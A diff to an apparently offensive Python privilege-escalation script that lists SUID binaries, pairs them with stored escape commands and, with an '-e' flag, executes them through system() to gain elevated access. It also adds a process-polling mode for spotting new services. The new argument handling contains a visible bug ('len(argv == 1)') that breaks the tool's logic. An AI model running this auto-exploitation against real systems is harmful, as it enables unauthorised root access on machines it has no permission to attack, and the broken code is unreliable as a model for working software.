@@ -188,7 +188,7 @@ def listAllSUIDBinaries():
 	print(white + "[" + blue + "#" + white + "] " + yellow + "Finding/Listing all SUID Binaries ..")
 	print(white + barLine)
 	
-	command 	= "find / -perm -4000 -type f 2>/dev/null" # Since /4000 isn't backwards compatible with old versions of find ..  :)) 
+	command 	= "find / -perm -4000 -type f 2>/dev/null" # Since /4000 isn't backwards compatible with old versions of find ..  :))
 	result 		= popen(command).read().strip().split("\n")
 	
 	for bins in result:
@@ -287,51 +287,98 @@ def doSomethingPlis(listOfSuidBins):
 	return(binsInGTFO, defaultSuidBins, customSuidBins)
 
 
+def monitServices():
+	command = "ps -eo pid,cmd"
+	baseProcess = {}
+	nextProcess = {}
+
+	result = popen(command).read().strip().split("\n")
+	result.pop(0)
+	result.pop(-1)
+	for r in result:
+		baseProcess.update({r.strip().split(" ")[0] : r.strip().split(" ")[1]})
+
+	while True:
+		result.clear()
+		result = popen(command).read().strip().split("\n")
+		result.pop(0)
+		result.pop(-1)
+		for r in result:
+			nextProcess.update({r.strip().split(" ")[0] : r.strip().split(" ")[1]})
+		keys_base = set(baseProcess.keys())
+		keys_next = set(nextProcess.keys())
+		diff = keys_next - keys_base
+
+		if diff:
+			for d in diff:
+				print(red + "Found: " + nextProcess[d])
+			print(yellow + "------------------------------------")
+
+		baseProcess = nextProcess.copy()
+		nextProcess.clear()
+
+		sleep(5)
+
+def getopts():
+	commands = []
+
+	suidBins = listAllSUIDBinaries()
+	gtfoBins = doSomethingPlis(suidBins)
+	bins = gtfoBins[0]
+
+	if len(argv) == 2:
+		if argv[1] == '-e':
+			print(white + "[" + magenta + "$" + white + "] " + white + "Auto Exploiting SUID bit binaries !!!")
+			print(white + barLine)
+
+			for suidBins in bins:
+				_bin = suidBins.split("/")[::-1][0]
+
+				if _bin in suidExploitation:
+					_results = suidBins + " " + suidExploitation[_bin]
+					commands.append(_results)
+
+			for _commands in commands:
+				print(magenta + "\n[#] Executing Command .. ")
+				print(cyan + "[~] " + _commands + "\n" + white)
+				sleep(0.5)
+				system(_commands)
+				sleep(0.5)
+
+		if argv[1] == '-p':
+			print(white + "[" + magenta + "$" + white + "] " + white + "Checking services...")
+			print(white + barLine)
+			monitServices()
+
+	if len(argv == 1):
+		for suidBins in bins:
+			_bin = suidBins.split("/")[::-1][0]
+
+			if _bin in suidExploitation:
+				_results = suidBins + " " + suidExploitation[_bin]
+				commands.append(_results)
+
+	else:
+		print(
+			white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
+		print(white + barLine)
+
+		for _commands in commands:
+			print("[~] " + _commands)
+
+	print(white + barLine + "\n\n")
+
 def note():
 	print(white + "[" + red + "-" + white + "] " + magenta + "Note")
 	print(white + barLine)
 	print(blue  + "If you see any FP in the output, please report it to make the script better! :)")	
 	print(white + barLine + "\n")
 
-def exploitThisShit(bins):
-	commands 	= []
-
-	for suidBins in bins:
-		_bin 	= suidBins.split("/")[::-1][0]
-		
-		if _bin in suidExploitation:
-			_results 	= suidBins + " " + suidExploitation[_bin]
-			commands.append(_results)
-
-	if len(commands) != 0:
-		if len(argv) == 2:
-			if argv[1] == '-e':
-				print(white + "[" + magenta + "$" + white + "] " + white + "Auto Exploiting SUID bit binaries !!!")
-				print(white + barLine)
-
-				for _commands in commands:
-					print(magenta + "\n[#] Executing Command .. ")
-					print(cyan + "[~] " + _commands + "\n" + white)
-					sleep(0.5)
-					system(_commands)
-					sleep(0.5)
-
-		else:
-			print(white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit harmless SUID bin(s) found !!!")
-			print(white + barLine)
-
-			for _commands in commands:
-				print("[~] " + _commands)
-
-		print(white + barLine + "\n\n")	
-
 def main():
 	print(banner)
 	try:
-		suidBins 	= listAllSUIDBinaries()
-		gtfoBins 	= doSomethingPlis(suidBins)
-		exploitThisShit(gtfoBins[0]); note()
-
+		getopts()
+		note()
 	except KeyboardInterrupt:
 		print("\n[" + red + "!" + white + "] " + red + "Aye, why you do dis!?")
 
